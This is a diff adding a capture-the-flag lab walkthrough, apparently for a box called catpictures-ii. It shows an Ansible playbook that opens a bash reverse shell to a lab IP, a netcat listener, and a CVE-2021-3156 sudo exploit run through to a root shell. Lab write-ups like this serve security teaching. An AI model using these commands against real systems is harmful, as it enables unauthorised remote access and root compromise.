@@ -161,6 +161,117 @@ ansible runner (olivetin): port 1337
 
 
 
+```
+---
+- name: Test 
+  hosts: all                                  # Define all the hosts
+  remote_user: bismuth                                  
+  # Defining the Ansible task
+  tasks:             
+    - name: get the username running the deploy
+      become: false
+      command: whoami
+      register: username_on_the_host
+      changed_when: false
+
+    - debug: var=username_on_the_host
+
+    - name: Test
+      shell: bash -c "bash -i >& /dev/tcp/10.6.49.189/5555 0>&1"
+```
+
+![image](https://github.com/user-attachments/assets/c22c4b7c-8dbd-44fe-bce2-d5871e43f2a3)
+
+now listen on 5555:
+
+```
+nc -lvpn 5555
+```
+
+open ansibel and click ``Run ansible playbook``
+
+![image](https://github.com/user-attachments/assets/264eabb6-57eb-4922-a051-baec2f873c5a)
+
+now for ``prevesc``
+
+![image](https://github.com/user-attachments/assets/680b92ef-8d54-46fd-91ff-c07d958e17a0)
+
+notice that ``sudo version`` is old
+
+![image](https://github.com/user-attachments/assets/66fa7446-f996-43ca-956e-9e5f69daae6f)
+
+![image](https://github.com/user-attachments/assets/8dce471e-60e4-45a5-95be-b8dfecb3b0c1)
+
+```
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+```
+
+```
+make
+```
+
+```
+./sudo-hax-me-a-sandwich
+```
+
+``output``
+
+```
+bismuth@catpictures-ii:~/exploit$ ./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+  manual mode:
+    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+```
+
+```bash
+bismuth@catpictures-ii:~/exploit$ cat /etc/os-release
+cat /etc/os-release
+NAME="Ubuntu"
+VERSION="18.04.6 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.6 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+bismuth@catpictures-ii:~/exploit$ /usr/bin/sudo --version
+/usr/bin/sudo --version
+
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+bismuth@catpictures-ii:~/exploit$ 
+bismuth@catpictures-ii:~/exploit$ ldd /bin/ls | grep libc
+ldd /bin/ls | grep libc
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc84d412000)
+bismuth@catpictures-ii:~/exploit$ ./sudo-hax-me-a-sandwich 0
+./sudo-hax-me-a-sandwich 0
+
+whoami
+root
+
+```
+
+![image](https://github.com/user-attachments/assets/18ece628-2123-4b38-81c5-e9601cd8d843)
+
 
 
 
